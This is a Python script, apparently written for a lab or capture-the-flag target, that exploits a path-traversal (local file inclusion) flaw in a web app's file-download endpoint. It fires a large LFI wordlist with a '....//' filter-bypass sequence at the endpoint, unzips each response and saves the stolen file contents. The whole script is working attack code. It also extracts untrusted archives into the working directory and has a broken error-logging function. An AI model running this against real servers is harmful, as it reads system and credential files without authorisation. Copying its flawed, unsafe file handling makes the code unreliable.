# This script will scan for LFI and print out any results using the provided file. 
# It will print out two files, one with all of the results and one with the errors in your current working directory.
# It will also print out what position it is at.

import aiohttp
import asyncio
import io
import logging
import os
import zipfile

cwd = os.getcwd()

error_fileName = "errors.txt"
errors_path = cwd + "/" + error_fileName

result_fileName = "result.txt"
result_path = cwd + "/" + result_fileName

if os.path.isfile(result_path):
    os.remove(result_path)

if os.path.isfile(errors_path):
    os.remove(errors_path)

#wordlist_path = "LFI_fileFinder_wordlist.txt"
wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt"

with open(wordlist_path, mode="r") as file:
    words = file.readlines()

wordsToCheck = len(words)

async def fetch(session, word):
    url = f"http://LINK/download?file=....//....//....//....//....//....//....//{word}"
    async with session.get(url) as response:
        if not response.content_length or response.content_length == 0:
            return None
        return await response.read()

async def fileloop():
    async with aiohttp.ClientSession() as session:
        tasks = []
        wordsChecked = 0
        for word in words:
            wordsChecked = wordsChecked + 1
            print(str(wordsChecked) + "/" + str(wordsToCheck) + "\t" + "Checking: " + word )
            task = asyncio.ensure_future(fetch(session, word))
            tasks.append(task)
        results = await asyncio.gather(*tasks)
        for result in results:
            if result:
                printfilecontents(result)
      
                


def printfilecontents(contentBytes):
    z = zipfile.ZipFile(io.BytesIO(contentBytes))
    z.extractall()

    for filename in z.namelist():
        with open(filename, 'r') as f:
            try:
                contents = "-" * 12 + "\n" + filename + "\n"
                contents = contents + f.read()
                contents = contents + "-" * 12 + "\n"
                print(contents)
                closeFiles(str(contents))
            except:
                print("Not able to read file:" + filename)
                with open(errors_path, mode="a") as file_errors:
                    file_errors.write(filename + " was unable to be read. \n")
                    
        os.remove(filename)

def closeFiles(contents):
    result_file = open(result_path, mode="a")
    result_file.write(contents)
    result_file.close()
    
    file = open(wordlist_path, mode="r")
    file.close()
    
    file_errors = open(errors_path, mode="a")
    file_errors.write(file_errors)
    file_errors.close()
   
if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")

    loop = asyncio.get_event_loop()
    loop.run_until_complete(fileloop())


